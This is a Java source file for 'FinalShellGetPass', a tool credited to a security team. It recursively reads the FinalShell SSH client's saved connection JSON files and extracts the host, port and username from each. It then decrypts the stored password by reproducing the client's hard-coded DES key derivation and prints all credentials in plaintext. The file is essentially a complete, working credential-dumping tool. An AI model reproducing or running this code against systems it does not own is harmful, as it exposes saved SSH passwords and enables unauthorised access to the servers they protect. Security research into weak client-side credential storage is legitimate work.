import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

public class Main {

    static final String HOST_SPLIT     = "host\":\"";
    static final String PORT_SPLIT     = "port\":";
    static final String USERNAME_SPLIT = "user_name\":\"";
    static final String PASSWORD_SPLIT = "password\":\"";

    static final String COMMA_MARK     = ",";
    static final String QUOTATION_MARK = "\"";

    static final String CONN_FILE_SUFFIX = "_connect_config.json";

    static SecureRandom   sr;
    static Base64.Decoder b64d = Base64.getDecoder();

    public static void main(String[] args) {
        if (args.length == 0) {
            System.out.println("""
            参数: 跟FinalShell的conn文件夹路径
            ----Win: FinalShellGetPass.exe X:\\FinalShell的安装目录\\conn\\
            ----Mac: FinalShellGetPass ~/Library/FinalShell/conn/
            """);
            return;
        }

        File rootFile = new File(args[0]);
        if(!rootFile.exists()) {
            System.out.println("文件夹不存在!");
        }

        System.out.println("""
         _____ _             _ ____  _          _ _  ____      _   ____
         |  ___(_)_ __   __ _| / ___|| |__   ___| | |/ ___| ___| |_|  _ \\ __ _ ___ ___
         | |_  | | '_ \\ / _` | \\___ \\| '_ \\ / _ \\ | | |  _ / _ \\ __| |_) / _` / __/ __|
         |  _| | | | | | (_| | |___) | | | |  __/ | | |_| |  __/ |_|  __/ (_| \\__ \\__ \\
         |_|   |_|_| |_|\\__,_|_|____/|_| |_|\\___|_|_|\\____|\\___|\\__|_|   \\__,_|___/___/
         Team: MaskSec
         Author: RichardTang
         GitHub: https://github.com/MaskCyberSecurityTeam/FinalShellGetPass
        """);

        List<File> connFiles = getConnJsonFile(args[0], new ArrayList<>());

        System.out.println("===============================================");
        for (File file : connFiles) {

            String fileContent;
            try {
                fileContent = Files.readString(file.toPath());
            } catch (IOException ioException) {
                ioException.printStackTrace();
                break;
            }

            String host;
            String port;
            String username;
            String password;

            host = fileContent.split(HOST_SPLIT)[1].split(QUOTATION_MARK)[0];
            port = fileContent.split(PORT_SPLIT)[1].split(COMMA_MARK)[0];
            username = fileContent.split(USERNAME_SPLIT)[1].split(QUOTATION_MARK)[0];

            try {
                password = decodePass(fileContent.split(PASSWORD_SPLIT)[1].split(QUOTATION_MARK)[0]);
            } catch (Exception e) {
                password = "密码解密失败!";
            }

            System.out.printf("Host: %s\r\n", host);
            System.out.printf("Port: %s\r\n", port);
            System.out.printf("UserName: %s\r\n", username);
            System.out.printf("PassWord: %s\r\n", password);
            System.out.println("===============================================");
        }
    }

    static List<File> getConnJsonFile(String filePath, List<File> fileList) {
        File root = new File(filePath);
        if (root.exists()) {
            File[] files = root.listFiles();
            for (File file : files) {
                if (file.isDirectory()) {
                    getConnJsonFile(file.getAbsolutePath(), fileList);
                } else {
                    if (file.getName().contains(CONN_FILE_SUFFIX)) {
                        fileList.add(file);
                    }
                }
            }
        }
        return fileList;
    }

    static boolean checkStr(String str) {
        if (str == null) {
            return true;
        } else {
            String s2 = str.trim();
            return "".equals(s2);
        }
    }

    static String decodePass(String data) throws Exception {
        if (data == null) {
            return null;
        } else {
            String rs = "";
            if (!checkStr(data)) {
                byte[] buf = b64d.decode(data);
                byte[] head = new byte[8];
                System.arraycopy(buf, 0, head, 0, head.length);
                byte[] d = new byte[buf.length - head.length];
                System.arraycopy(buf, head.length, d, 0, d.length);
                byte[] bt = desDecode(d, ranDomKey(head));
                rs = new String(bt, StandardCharsets.UTF_8);
            }
            return rs;
        }
    }

    static byte[] ranDomKey(byte[] head) throws NoSuchAlgorithmException {
        long ks = 3680984568597093857L / (long) (new Random(head[5])).nextInt(127);
        Random random = new Random(ks);
        int t = head[0];

        for (int i = 0; i < t; ++i) {
            random.nextLong();
        }

        long n = random.nextLong();
        Random r2 = new Random(n);
        long[] ld = new long[]{(long) head[4], r2.nextLong(), (long) head[7], (long) head[3], r2.nextLong(), (long) head[1], random.nextLong(), (long) head[2]};
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(bos);
        long[] arrayOfLong1 = ld;
        int j = ld.length;

        for (byte b = 0; b < j; ++b) {
            long l = arrayOfLong1[b];

            try {
                dos.writeLong(l);
            } catch (IOException var18) {
                var18.printStackTrace();
            }
        }

        try {
            dos.close();
        } catch (IOException var17) {
            var17.printStackTrace();
        }

        byte[] keyData = bos.toByteArray();
        keyData = md5(keyData);
        return keyData;
    }

    static byte[] md5(byte[] data) throws NoSuchAlgorithmException {
        return MessageDigest.getInstance("MD5").digest(data);
    }

    static byte[] desDecode(byte[] data, byte[] key) throws Exception {
        DESKeySpec dks = new DESKeySpec(key);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
        SecretKey secretKey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(2, secretKey, sr);
        return cipher.doFinal(data);
    }
}
